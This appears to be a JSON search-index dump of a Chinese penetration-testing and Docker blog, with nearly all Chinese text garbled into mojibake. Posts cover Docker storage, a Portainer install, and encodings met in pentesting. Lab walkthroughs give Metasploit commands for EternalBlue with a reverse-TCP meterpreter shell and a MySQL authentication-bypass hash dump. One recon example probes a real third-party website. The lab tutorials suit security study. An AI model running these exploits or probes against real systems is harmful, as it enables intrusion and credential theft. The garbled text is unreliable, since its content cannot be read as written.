&emsp;&emsp;Linuxä¸Šå¯ç”¨çš„å­˜å‚¨å¼•æ“æœ‰AUFSã€Overlay2ã€Device Mapperã€Btrfsä»¥åŠZFSã€‚é¡¾åæ€ä¹‰ï¼Œæ¯ç§å­˜å‚¨å¼•æ“éƒ½åŸºäºLinuxä¸­å¯¹åº”çš„æ–‡ä»¶ç³»ç»Ÿæˆ–è€…å—è®¾å¤‡æŠ€æœ¯ï¼Œå¹¶ä¸”æ¯ç§å­˜å‚¨å¼•æ“æ“éƒ½æœ‰å…¶ç‹¬æœ‰çš„æ€§èƒ½ç‰¹ç‚¹ã€‚ &emsp;&emsp;Dockeråœ¨Windowsä¸Šä»…æ”¯æŒwindowsfilterä¸€ç§å­˜å‚¨å¼•æ“ï¼Œè¯¥å¼•æ“åŸºäºNTFSæ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šå®ç°äº†åˆ†å±‚å’ŒCoW[1]ã€‚ &emsp;&emsp;ä¸‹å›¾å±•ç¤ºäº†ä¸ç³»ç»Ÿæ˜¾ç¤ºç›¸åŒçš„ä¸‰å±‚é•œåƒã€‚æ‰€æœ‰é•œåƒå±‚å †å å¹¶åˆå¹¶ï¼Œå¯¹å¤–æä¾›ç»Ÿä¸€çš„è§†å›¾ã€‚ ï¼ˆ3ï¼‰ç‰¹ç‚¹&emsp;&emsp;Dockeré•œåƒéƒ½æ˜¯åªè¯»çš„ï¼Œå½“å®¹å™¨å¯åŠ¨æ—¶ï¼Œä¸€ä¸ªæ–°çš„å¯å†™å±‚è¢«åŠ è½½åˆ°é•œåƒçš„é¡¶éƒ¨ï¼ &emsp;&emsp;è¿™ä¸€å±‚å°±æ˜¯æˆ‘ä»¬é€šå¸¸è¯´çš„å®¹å™¨å±‚ï¼Œå®¹å™¨ä¹‹ä¸‹çš„éƒ½å«é•œåƒå±‚ï¼","categories":[],"tags":[],"author":"w01ke"},{"title":"Portainerå¯è§†åŒ–é¢æ¿å®‰è£…","slug":"Portainerå¯è§†åŒ–é¢æ¿å®‰è£…","date":"2021-12-13T11:45:23.000Z","updated":"2022-01-03T03:29:03.443Z","comments":true,"path":"post/2f19e9de.html","link":"","permalink":"https://wolke.cn/post/2f19e9de.html","excerpt":"","text":"Rancherï¼ˆCI/CDå†ç”¨ï¼‰ Portainerï¼ˆå…ˆç”¨è¿™ä¸ªï¼‰ docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer[root@VM-0-15-centos ~]# docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainerd93e31b351d5e51dd006ab068e99507ce92185b4b6c8cc5aea6babb0e81b716f[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd93e31b351d5 portainer/portainer &quot;/portainer&quot; 7 seconds ago Up 6 seconds 0.0.0.0:8088-&gt;9000/tcp, :::8088-&gt;9000/tcp romantic_kepler64dc6975f6e4 tomcat &quot;catalina.sh run&quot; 52 minutes ago Up 52 minutes 0.0.0.0:3355-&gt;8080/tcp, :::3355-&gt;8080/tcp tomcat01d0850b4943fc nginx &quot;/docker-entrypoint.â€¦&quot; 15 hours ago Up 15 hours 0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp nginx01 è®¿é—®8088ç«¯å£ï¼Œåˆ›å»ºè´¦æˆ· æˆ‘ä»¬é€‰æ‹©localå³å¯ å¯ä»¥ç®¡ç†docker","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"åŠ å¯†ç¼–ç ç®—æ³•","slug":"åŠ å¯†ç¼–ç ç®—æ³•","date":"2021-12-13T11:22:59.000Z","updated":"2022-01-03T03:24:22.931Z","comments":true,"path":"post/57602181.html","link":"","permalink":"https://wolke.cn/post/57602181.html","excerpt":"","text":"ä¸€ã€å‰è¨€&emsp;&emsp;åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œå¸¸è§çš„å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ä¼šé‡‡ç”¨åŠ å¯†å¤„ç†ï¼Œå…¶ä¸­ä½œä¸ºå®‰å…¨æµ‹è¯•äººå‘˜å¿…é¡»è¦äº†è§£å¸¸è§çš„åŠ å¯†æ–¹å¼ï¼Œæ‰èƒ½ä¸ºåç»­çš„å®‰å…¨æµ‹è¯•åšå¥½å‡†å¤‡ï¼Œæœ¬æ¬¡è¯¾ç¨‹å°†è®²è§£å„ç§åŠ å¯†ç¼–ç ç­‰çŸ¥è¯†ï¼Œä¾¿äºåæœŸçš„å­¦ä¹ å’Œå‘å±• äºŒã€å¸¸è§åŠ å¯†ç¼–ç ç­‰ç®—æ³•è§£æ&emsp;&emsp;MD5ï¼ŒSHAï¼ŒASCï¼Œè¿›åˆ¶ï¼Œæ—¶é—´æˆ³ï¼ŒURLï¼ŒBASE64ï¼ŒUnescapeï¼ŒAESï¼ŒDESç­‰ 1ã€MD5ï¼ˆä¸å¯é€†ï¼‰&emsp;&emsp;16ä½å’Œ32ä½ï¼ŒåŠ å¯†å¯†æ–‡å­—ç¬¦ä¸²ç”±A-F,0-9éšæœºåˆ†é…ï¼Œ80%ç½‘ç«™ç®¡ç†å‘˜æˆ–ç”¨æˆ·å¯†ç åŠ é‡‡å–MD5åŠ å¯†ã€‚(ä¸å¯é€†) &emsp;&emsp;ç½‘ä¸Šçš„MD5åœ¨çº¿å·¥å…·ï¼Œå®ƒçš„è§£å¯†è¿‡ç¨‹æ˜¯ç”¨äº†æšä¸¾æ–¹æ³• 2ã€SHA&emsp;&emsp;ç”±A-Zï¼Œ0-9éšæœºç»„åˆï¼ŒSHA1ï¼ŒSHA256ï¼ŒSHA384ï¼ŒSHA512é•¿åº¦å›ºå®šã€‚(ä¸å¯é€†ï¼‰ 3ã€è¿›åˆ¶&emsp;&emsp;16è¿›åˆ¶åŠ å¯† 4ã€Unixæ—¶é—´æˆ³&emsp;&emsp;ç½‘ç«™æˆ–è€…æœåŠ¡å™¨è„šæœ¬è¯­è¨€é‡Œç»å¸¸ä¼šä½¿ç”¨ï¼Œä¼šåœ¨æ•°æ®åº“é‡Œç”¨æˆ·ç™»å½•å’Œæ³¨é”€ï¼Œæ³¨å†Œé‡Œä¼šä½¿ç”¨ 5ã€URL&emsp;&emsp;æµè§ˆå™¨åªåšä¸€æ¬¡åŠ å¯†ï¼Œåœ¨æ¸—é€ç»•è¿‡çš„æ—¶å€™å¯èƒ½ä¼šä½¿ç”¨äºŒæ¬¡ï¼Œä¸‰æ¬¡åŠ å¯†æ–¹å¼ 6ã€Base64&emsp;&emsp;å¤§å°å†™éšæœºç»„åˆï¼Œåœ¨å­—ç¬¦ä¸²åé¢ç»å¸¸å‡ºç°ä¸€ä¸ªæˆ–ä¸¤ä¸ªç­‰å· &emsp;&emsp;æ˜æ–‡è¶Šé•¿ï¼Œå¯†æ–‡è¶Šé•¿ &emsp;&emsp;å¸¸è§åº”ç”¨ï¼šä»£ç ã€å¯†ç ã€å‚æ•° &emsp;&emsp;æµè§ˆå™¨åªåšä¸€æ¬¡åŠ å¯†ï¼Œåœ¨æ¸—é€ç»•è¿‡çš„æ—¶å€™å¯èƒ½ä¼šä½¿ç”¨äºŒæ¬¡ï¼Œä¸‰æ¬¡åŠ å¯†æ–¹å¼ 7ã€Unescape&emsp;&emsp;%u+4ä½æ•°å­—ï¼Œå¯¹åº”ä¸¤ä½å­—ç¬¦ï¼Œä¸»è¦åº”ç”¨WEBåº”ç”¨ä¸Š &emsp;&emsp;å½“æ˜æ–‡å­—ç¬¦æ•°é‡ä¸ºå•æ•°æ—¶ &emsp;&emsp;ä¸ºåŒæ•°æ—¶ï¼Œæœ€åä¸€ä¸ªä¸º%u0000 &emsp;&emsp;é€šè¿‡å•æ•°å’ŒåŒæ•°çš„æ¯”è¾ƒä¹Ÿèƒ½ä¾§é¢åæ˜ å‡ºï¼Œ%u+4ä½æ•°å­—å¯¹åº”ä¸¤ä½å­—ç¬¦ 8ã€AES&emsp;&emsp;æ˜¯ä¸€ç§å®‰å…¨çš„åŠ å¯†æ–¹å¼ï¼Œæ¶‰åŠåˆ°å¯†ç ï¼Œåç§»é‡ï¼Œæ•°æ®å—ï¼Œå¡«å……ï¼Œåœ¨åŠ å¯†æ—¶å€™æ¶‰åŠåˆ°4ç§éšæœºæ€§ã€‚è§£å¯†éš¾åº¦å¤§ã€‚ç”¨base64è§£å¯†å‡ºæ¥æ˜¯ä¹±ç ï¼Œæœ‰å¾ˆå¤§å¯èƒ½æ˜¯AESåŠ å¯†ã€‚æœ‰æ—¶å€™/å‡ºç°åœ¨å­—ç¬¦ä¸²é‡Œé¢ã€‚æ¯”è¾ƒæ³¨é‡å®‰å…¨å’Œå¤§å‹ç½‘ç«™ã€å®‰å…¨æ¯”èµ› 9ã€DES&emsp;&emsp;ç±»ä¼¼äºBASE64ï¼Œæœ‰æ—¶å€™+ä¼šå‡ºç°å­—ç¬¦ä¸²é‡Œ ä¸‰ã€å¸¸è§åŠ å¯†å½¢å¼ç®—æ³•è§£æ&emsp;&emsp;ç›´æ¥åŠ å¯†ï¼Œå¸¦saltï¼Œå¸¦å¯†ç ï¼Œå¸¦åç§»ï¼Œå¸¦ä½æ•°ï¼Œå¸¦æ¨¡å¼ï¼Œå¸¦å¹²æ‰°ï¼Œè‡ªå®šä¹‰ç»„åˆç­‰ å››ã€å¸¸è§è§£å¯†æ–¹å¼ï¼ˆé’ˆå¯¹ï¼‰&emsp;&emsp;æšä¸¾ï¼Œè‡ªå®šä¹‰é€†å‘ç®—æ³•ï¼Œå¯é€†å‘ äº”ã€äº†è§£å¸¸è§„åŠ å¯†ç®—æ³•çš„ç‰¹æ€§&emsp;&emsp;é•¿åº¦ä½æ•°ï¼Œå­—ç¬¦è§„å¾‹ï¼Œä»£ç åˆ†æï¼Œæœç´¢è·å–ç­‰ å…­ã€æ¼”ç¤ºæ¡ˆä¾‹1ã€SQLæ³¨å…¥æ¼æ´æµ‹è¯•ï¼ˆå‚æ•°åŠ å¯†ï¼‰ è¿›å…¥é¢˜ç›® ä½¿ç”¨å¾¡å‰‘æ‰«æè¯¥IP åœ¨æµè§ˆå™¨ä¸­è¾“å…¥è¯¥URLï¼Œå‘ç°ä½¿ç”¨PHPæ–‡ä»¶ è®¿é—®è¯¥URLï¼Œä¸‹è½½å‹ç¼©åŒ…å¹¶è§£å‹ å¾—åˆ°è§£å¯†æºç  å®¡è®¡æºç ï¼Œå‘ç°æ˜¯ç”±ä¸¤æ¬¡base64åŠ å¯†å¾—åˆ°ã€‚ä¸€æ¬¡base64è§£å¯†ï¼Œ äºŒæ¬¡base64è§£å¯†ï¼š &emsp;&emsp;é€‰ä¸­å¯¹åº”æ¨¡å¼ï¼š&emsp;&emsp;AESåŠ å¯†æ¨¡å¼ï¼šCBCã€æ•°æ®å—ï¼š128ä½ã€å¯†ç ï¼šydhaqPQnexoaDuW3ã€åç§»é‡ï¼š2018201920202021&emsp;&emsp;è§£å¯†å¾—å‡ºï¼š1_mozhe å®¡è®¡ä»£ç ï¼Œæœ€ç»ˆå¾—å‡ºå€¼ä¸ºï¼š1 åœ¨SQLæ³¨å…¥æ—¶ï¼Œè¦å°†1 and 1=1æˆ–è€…å…¶ä»–payloadå…±åŒæŒ‰æ ¼å¼åŠ å¯†ä¹‹åæ‰å¯ä»¥è¿›è¡Œ","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"ç³»ç»ŸåŠæ•°æ®åº“ç­‰","slug":"ç³»ç»ŸåŠæ•°æ®åº“ç­‰","date":"2021-12-13T11:09:41.000Z","updated":"2022-01-30T14:52:46.171Z","comments":true,"path":"post/1f6ee220.html","link":"","permalink":"https://wolke.cn/post/1f6ee220.html","excerpt":"","text":"ä¸€ã€å‰è¨€&emsp;&emsp;é™¤å»å‰æœŸè®²åˆ°è¿‡çš„æ­å»ºå¹³å°ä¸­é—´ä»¶ï¼Œç½‘ç«™æºç å¤–ï¼Œå®¹æ˜“æ”¶åˆ°æ”»å‡»çš„è¿˜æœ‰æ“ä½œç³»ç»Ÿï¼Œæ•°æ®åº“ï¼Œç¬¬ä¸‰æ–¹è½¯ä»¶å¹³å°ç­‰ï¼Œå…¶ä¸­æ­¤ç±»æ”»å‡»ä¹Ÿèƒ½ç›´æ¥å½±å“åˆ°Webæˆ–æœåŠ¡å™¨çš„å®‰å…¨ï¼Œå¯¼è‡´ç½‘ç«™æˆ–æœåŠ¡å™¨æƒé™çš„è·å– äºŒã€æ“ä½œç³»ç»Ÿå±‚é¢1ã€è¯†åˆ«æ“ä½œç³»ç»Ÿå¸¸è§æ–¹æ³•ï¼ˆ1ï¼‰æ ¹æ®ç½‘ç«™è¯†åˆ«aã€é€šè¿‡æ–‡ä»¶è·¯å¾„çš„å¤§å°å†™åˆ¤æ–­&emsp;&emsp;éšä¾¿é€šè¿‡è°·æ­Œè¯­æ³•æœç´¢ç‚¹phpçš„ç½‘ç«™ &emsp;&emsp;çœ‹åˆ°ä¸€ä¸ªç½‘ç«™ï¼Œè¿›å…¥çœ‹çœ‹ï¼ŒURLä¸ºï¼šhttp://www.qingxin.com.cn/cn/index.php &emsp;&emsp;å½“æŠŠURLæ”¹ä¸ºï¼šhttp://www.qingxin.com.cn/cn/indeX.phpï¼Œæ˜¾ç¤º404ï¼Œè¯´æ˜å¤§å°å†™æ•æ„Ÿï¼Œåº”è¯¥æ˜¯Linuxæ“ä½œç³»ç»Ÿ ï¼ˆ2ï¼‰TTLå€¼åˆ¤æ–­ï¼ˆä¸æ¨èï¼Œæœ‰æ—¶ä¸å‡†ç¡®ï¼‰&emsp;&emsp;ä¸åŒçš„æ“ä½œç³»ç»Ÿçš„é»˜è®¤TTLå€¼æ˜¯ä¸åŒçš„ï¼Œ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡TTLå€¼æ¥åˆ¤æ–­ä¸»æœºçš„æ“ä½œç³»ç»Ÿï¼Œä½†æ˜¯å½“ç”¨æˆ·ä¿®æ”¹äº†TTLå€¼çš„æ—¶å€™ï¼Œå°±ä¼šè¯¯å¯¼æˆ‘ä»¬çš„åˆ¤æ–­ï¼Œæ‰€ä»¥è¿™ç§åˆ¤æ–­æ–¹å¼ä¹Ÿä¸ä¸€å®šå‡†ç¡®ã€‚ä¸‹é¢æ˜¯é»˜è®¤æ“ä½œç³»ç»Ÿçš„TTLï¼š 1ã€WINDOWS NT/2000 TTLï¼š1282ã€WINDOWS 95/98 TTLï¼š323ã€UNIX TTLï¼š2554ã€LINUX TTLï¼š645ã€WIN7 TTLï¼š64 &emsp;&emsp;æ¯”å¦‚pingä¸€ä¸‹www.xiaodi8.comï¼Œå¯ä»¥å‘ç°TTLä¸º109ï¼Œä¸128æœ€ç›¸è¿‘ï¼Œå› æ­¤åˆ¤æ–­ä¸ºWindows NT/2000ï¼Œäº‹å®ä¸Šçš„ç¡®å¦‚æ­¤ ï¼ˆ3ï¼‰ä½¿ç”¨nmapç­‰æ‰«æå·¥å…·&emsp;&emsp;nmap -O IP 2ã€æ“ä½œç³»ç»ŸåŒºåˆ«åŠè¯†åˆ«æ„ä¹‰åŒºåˆ«ï¼šç½‘ç«™è·¯å¾„ã€å¤§å°å†™ã€æ–‡ä»¶åœ¨ä¸¤ä¸ªç³»ç»Ÿä¹‹é—´çš„é€‚ç”¨æ€§ï¼Œå…¼å®¹æ€§ è¯†åˆ«æ„ä¹‰ï¼šå¦‚æœåˆ¤æ–­å‡ºæ˜¯å“ªç§æ“ä½œç³»ç»Ÿï¼Œå°±ä¼šä»æ“ä½œç³»ç»Ÿæ‰€æ”¯æŒçš„æ¼æ´ç±»å‹ä¸‹æ‰‹ ä¸‰ã€æ•°æ®åº“å±‚é¢å°å‹æ•°æ®åº“ Accessä¸­å‹æ•°æ®åº“ MySQLå¤§å‹æ•°æ®åº“ Oracleã€SQL Server 1ã€è¯†åˆ«æ•°æ®åº“ç±»å‹å¸¸è§æ–¹æ³•ï¼ˆ1ï¼‰é€šè¿‡ç½‘ç«™åŠæ“ä½œç³»ç»Ÿè¯†åˆ«aã€å¸¸è§çš„ç»„åˆasp + accessï¼ˆWindowsç‰¹æœ‰ï¼‰php + mysqlaspx + mssqlï¼ˆWindowsç‰¹æœ‰ï¼‰jsp + mssqlï¼Œoraclepython + mongodb................ ï¼ˆ2ï¼‰é€šè¿‡nmapç­‰å·¥å…·æ‰«æç«¯å£&emsp;&emsp;å¸¸ç”¨çš„æ•°æ®åº“é»˜è®¤ç«¯å£å·ï¼š 1ï¼Œå…³ç³»å‹æ•°æ®åº“SQL Server --- 1433Oracle --- 1521MySQL --- 3306Sybase --- 5000DB2 --- 5000PostgreSQL --- 54322ï¼ŒNOSQLæ•°æ®åº“Redis --- 6379Memcached --- 11211MongoDB --- 27017 2ã€æ•°æ®åº“ç±»å‹åŒºåˆ«åŠè¯†åˆ«æ„ä¹‰&emsp;&emsp;æ¯ä¸ªæ•°æ®åº“é‡Œé¢çš„å®‰å…¨æœºåˆ¶ï¼Œå†…éƒ¨ç»“æ„éƒ½æœ‰äº›è®¸ä¸ä¸€æ ·ï¼ŒåŒæ ·äº§ç”Ÿçš„æ¼æ´ä¹Ÿä¸ä¸€æ ·ã€‚ä¸åŒçš„æ•°æ®åº“ï¼Œæ”»å‡»æ–¹æ³•ã€æ¼æ´ç±»å‹åŠå½±å“éƒ½æœ‰ä¸åŒ 3ã€æ•°æ®åº“å¸¸è§æ¼æ´ç±»å‹åŠæ”»å‡»&emsp;&emsp;å¼±å£ä»¤æ”»å‡»ï¼šé€šè¿‡å¼±å£ä»¤ç™»å½•åˆ°æ•°æ®åº“ä¸­ï¼Œå¾—åˆ°ç½‘ç«™ç®¡ç†å‘˜æ•°æ®ä¿¡æ¯ï¼Œç™»å½•ç½‘ç«™åå°ï¼Œè¿›è¡Œä¿®æ”¹ 4ã€ç®€è¿°æ•°æ®åº“å±‚é¢æ¼æ´å½±å“èŒƒå›´&emsp;&emsp;é€šè¿‡æ¼æ´ï¼Œè¿›è¡Œæ”»å‡»ï¼Œä¹Ÿå¯ä»¥è·å–æ•°æ®åº“çš„ç›¸å…³æƒé™ï¼Œè¿›è¡Œä¸€ç³»åˆ—çš„æ“ä½œ å››ã€ç¬¬ä¸‰æ–¹å±‚é¢1ã€å¦‚ä½•åˆ¤æ–­æœ‰å“ªäº›ç¬¬ä¸‰æ–¹å¹³å°å’Œè½¯ä»¶&emsp;&emsp;å¸¸è§çš„ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼šJbossï¼ŒPHPmyadminï¼Œvsftpdï¼ˆç”¨æ¥æ­å»ºFTPæœåŠ¡çš„ï¼‰ï¼Œteamviewç­‰ &emsp;&emsp;æ¯”å¦‚phpmyadminçš„åˆ¤å®š é€šè¿‡ç½‘ç«™æ‰«æå…¶ç›®å½•æ¥åˆ¤å®šï¼Œå¦‚æœç½‘ç«™æ¢æµ‹ä¸åˆ°ï¼Œé‚£å°±é€šè¿‡ç«¯å£æ‰«æã€‚è¦å¤šå±‚æ¬¡åˆ¤æ–­ï¼Œä¸èƒ½ä»…é™äºç«¯å£æ‰«æï¼Œæ ¹æ®ä¸åŒçš„åº”ç”¨é‡‡å–ä¸åŒçš„æ–¹æ³•ã€‚ å¦‚æœnmapæ‰«æä¸å‡ºæ¥ï¼Œå¯èƒ½æ˜¯æœ‰ç¬¬ä¸‰æ–¹é˜²æŠ¤è½¯ä»¶ï¼ˆå®‰å…¨ç‹—ï¼‰ç­‰æ‹¦æˆªã€‚è¿˜æœ‰å¯èƒ½æ˜¯å¯¹æ–¹æœåŠ¡éƒ¨ç½²åœ¨å†…ç½‘ã€‚ 2ã€ç®€è¿°ä¸ºä»€ä¹ˆè¦è¯†åˆ«ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶&emsp;&emsp;é€šè¿‡è¯†åˆ«ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼Œæ¥æ‰¾å‡ºæ¼æ´ï¼Œä»è€Œè¿›è¡Œæ¸—é€æµ‹è¯• 3ã€ç®€è¿°ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶å®‰å…¨æµ‹è¯•çš„èŒƒå›´&emsp;&emsp;ç›´æ¥å½±å“åˆ°æƒé™ äº”ã€è¡¥å……&emsp;&emsp;é™¤å»å¸¸è§„webå®‰å…¨åŠappå®‰å…¨æµ‹è¯•å¤–ï¼Œç±»ä¼¼æœåŠ¡å™¨å•ä¸€æˆ–å¤æ‚çš„å…¶ä»–æœåŠ¡ï¼ˆé‚®ä»¶ï¼Œæ¸¸æˆï¼Œè´Ÿè½½å‡è¡¡ç­‰ï¼‰ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå®‰å…¨æµ‹è¯•ç›®æ ‡ï¼Œæ­¤ç±»ç›®æ ‡æµ‹è¯•åŸåˆ™åªæ˜¯å°‘äº†webåº”ç”¨æˆ–å…¶ä»–å®‰å…¨é—®é¢˜ï¼Œæ‰€ä»¥æ˜ç¡®å®‰å…¨æµ‹è¯•æ€è·¯æ˜¯å¾ˆé‡è¦çš„ å…­ã€æ“ä½œæ¼”ç¤º1ã€æ°¸æ’ä¹‹è“æ¼æ´æ¼”ç¤ºï¼ˆ1ï¼‰ä¸»æœºå‘ç°&emsp;&emsp;ä½¿ç”¨å‘½ä»¤ï¼šarp-scan -l è¿›è¡Œä¸»æœºå‘ç°ï¼Œå‘ç°äº†IPåœ°å€ä¸º192.168.43.155çš„ä¸»æœºï¼Œå³æˆ‘çš„é¶æœº ï¼ˆ2ï¼‰æ‰«æç«¯å£&emsp;&emsp;ä½¿ç”¨å‘½ä»¤ï¼šnmap -sV -p- 192.168.43.155ï¼Œå¯ä»¥çœ‹åˆ°ç›®æ ‡ä¸»æœºå¼€æ”¾äº†445ç«¯å£ ï¼ˆ3ï¼‰æ°¸æ’ä¹‹è“æ¼æ´åˆ©ç”¨msf6 &gt; use exploit/windows/smb/ms17_010_eternalbluemsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp**msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 192.168.43.167msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 192.168.43.155msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run ï¼ˆ4ï¼‰ææƒ&emsp;&emsp;è¿›å…¥shellï¼Œå‘ç°å·²ç»æ˜¯æœºå™¨æœ€é«˜æƒé™äº† 2ã€MySQLèº«ä»½è®¤è¯ç»•è¿‡ CVE-2012-2122 &emsp;&emsp;è¿›å…¥vulhubæ‰€åœ¨çš„æ–‡ä»¶å¤¹ï¼Œç„¶åè¿›å…¥CVE-2012-2122çš„æ–‡ä»¶å¤¹ &emsp;&emsp;å¸ƒç½®å¹¶å¯åŠ¨æµ‹è¯•ç¯å¢ƒï¼šdocker-compose build docker-compose up -d &emsp;&emsp;é¶æœºæŸ¥çœ‹IPåœ°å€ä¿¡æ¯ï¼Œä½¿ç”¨Kaliè¿›è¡Œnmapæ‰«æï¼šnmap -sV -O 192.168.43.44 &emsp;&emsp;æœç´¢MySQLæ¼æ´æ”»å‡»æ¨¡å—ï¼šsearch mysql &emsp;&emsp;åˆ©ç”¨æ¨¡å—ï¼šuse auxiliary/scanner/mysql/mysql_authbypass_hashdump &emsp;&emsp;è¿›è¡Œç›¸å…³è®¾ç½®ï¼š set rhosts 192.168.43.44 set username root run &emsp;&emsp;å…³é—­ç¯å¢ƒï¼šdocker-compose down ä¸ƒã€æ¶‰åŠèµ„æº&emsp;&emsp;https://github.com/hellogoldsnakeman/masnmapscan-V1.0 &emsp;&emsp;ä¹Ÿæ˜¯ä¸ªæ‰«æå·¥å…·ï¼Œä½†æ˜¯åŠŸèƒ½æ²¡æœ‰nmapå¤šä½†æ˜¯æ›´å¿«ï¼Œé€‚åˆè½»é‡çº§çš„å·¥ä½œ","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"w01ke"},{"title":"Webæºç æ‹“å±•","slug":"Webæºç æ‹“å±•","date":"2021-12-13T11:03:38.000Z","updated":"2022-01-03T03:30:45.132Z","comments":true,"path":"post/de8a59bf.html","link":"","permalink":"https://wolke.cn/post/de8a59bf.html","excerpt":"","text":"ä¸€ã€å‰è¨€&emsp;&emsp;WEB æºç åœ¨å®‰å…¨æµ‹è¯•ä¸­æ˜¯éå¸¸é‡è¦çš„ä¿¡æ¯æ¥æºï¼Œå¯ä»¥ç”¨æ¥ä»£ç å®¡è®¡æ¼æ´ä¹Ÿå¯ä»¥ç”¨æ¥åšä¿¡æ¯çªç ´å£ï¼Œå…¶ä¸­ WEB æºç æœ‰å¾ˆå¤šæŠ€æœ¯éœ€è¦ç®€æ˜åˆ†æã€‚ æ¯”å¦‚ï¼šè·å–æŸ ASP æºç åå¯ä»¥é‡‡ç”¨é»˜è®¤æ•°æ®åº“ä¸‹è½½ä¸ºçªç ´ï¼Œè·å–æŸå…¶ä»–è„šæœ¬æºç æ¼æ´å¯ä»¥è¿›è¡Œä»£ç å®¡è®¡æŒ–æ˜æˆ–åˆ†æå…¶ä¸šåŠ¡é€»è¾‘ç­‰ï¼Œæ€»ä¹‹æºç çš„è·å–å°†ä¸ºåæœŸçš„å®‰å…¨æµ‹è¯•æä¾›äº†æ›´å¤šçš„æ€è·¯ã€‚ äºŒã€å…³äºWebæºç ç›®å½•ç»“æ„&emsp;&emsp;æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œåå°ç›®å½•ï¼Œæ¨¡æ¿ç›®å½•ï¼Œæ•°æ®åº“ç›®å½•ç­‰ index.php æ ¹æ®æ–‡ä»¶åç¼€åˆ¤å®šadmin ç½‘ç«™åå°è·¯å¾„data æ•°æ®ç›¸å…³ç›®å½•install å®‰è£…ç›®å½•member ä¼šå‘˜ç›®å½•template æ¨¡æ¿ç›®å½•(å’Œç½‘ç«™ç›¸å…³çš„æ•´ä½“æ¶æ„)data =&gt; confing.php æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œç½‘ç«™å’Œæ•°æ®åº“çš„é€šè®¯ä¿¡æ¯ï¼Œè¿æ¥è´¦å·å¯†ç ï¼Œå¯ä»¥å»è¿æ¥å¯¹æ–¹æ•°æ®åº“ï¼Œä»æ•°æ®åº“å»å¾—åˆ°è¿™ä¸ªç½‘ç«™çš„æºç é‡Œé¢æ¶‰åŠåˆ°çš„ç®¡ç†å‘˜çš„è´¦å·å¯†ç ã€‚ ä¸‰ã€å…³äºWebæºç è„šæœ¬ç±»å‹&emsp;&emsp;ASPï¼ŒPHPï¼ŒASPXï¼ŒJSPï¼ŒJAVAWEBç­‰è„šæœ¬ç±»å‹æºç å®‰å…¨é—®é¢˜ å››ã€å…³äºWebæºç åº”ç”¨åˆ†ç±»&emsp;&emsp;ç¤¾äº¤ï¼Œè®ºå›ï¼Œé—¨æˆ·ï¼Œç¬¬ä¸‰æ–¹ï¼Œåšå®¢ç­‰ä¸åŒçš„ä»£ç æœºåˆ¶å¯¹åº”æ¼æ´ &emsp;&emsp;å¼€æºï¼Œæœªå¼€æºé—®é¢˜ï¼Œ æ¡†æ¶éæ¡†æ¶é—®é¢˜ï¼Œå…³äºCMSè¯†åˆ«é—®é¢˜åŠåç»­ç­‰ &emsp;&emsp;æ‹¿åˆ°å¯¹æ–¹çš„æºç æˆ–è€…åˆ¤æ–­è¿™ä¸ªç½‘ç«™çš„åº”ç”¨ç±»å‹ä¹‹ååº”è¯¥ä¾§é‡åœ¨å“ªäº›æ¼æ´ä¸Šåšæ–‡ç«  é—¨æˆ·ç½‘ç«™------------------------ç»¼åˆç±»æ¼æ´ç”µå•†------------------------------ä¸šåŠ¡é€»è¾‘æ¼æ´è®ºå›------------------------------XSSæ¼æ´åšå®¢------------------------------æ¼æ´è¾ƒå°‘ç¬¬ä¸‰æ–¹---------------------------æ ¹æ®åŠŸèƒ½å†³å®š äº”ã€å…³äºWebæºç å…¶ä»–è¯´æ˜1ã€æ¡†æ¶ä¸éæ¡†æ¶&emsp;&emsp;å¦‚æœå¯¹æ–¹ç½‘ç«™é‡‡ç”¨çš„æ˜¯æ¡†æ¶å¼€å‘çš„è¯é‚£ä¹ˆä½ é¢å¯¹çš„å°±æ˜¯å¯»æ‰¾æ¡†æ¶çš„æ¼æ´ï¼Œå¦‚æœæ˜¯éæ¡†æ¶çš„è¯å¯»æ‰¾çš„æ¼æ´é’ˆå¯¹çš„æ˜¯ä»£ç å†™å‡ºæ¥çš„æ¼æ´ï¼ˆä»£ç å®¡è®¡ï¼‰ &emsp;&emsp;æ¯”å¦‚ï¼šthinkPHPæ¼æ´ 2ã€CMSè¯†åˆ«ï¼ˆ1ï¼‰CMSçš„æ¦‚å¿µ&emsp;&emsp;CMSæ˜¯Content Management Systemçš„ç¼©å†™ï¼Œæ„ä¸ºâ€å†…å®¹ç®¡ç†ç³»ç»Ÿâ€ã€‚ 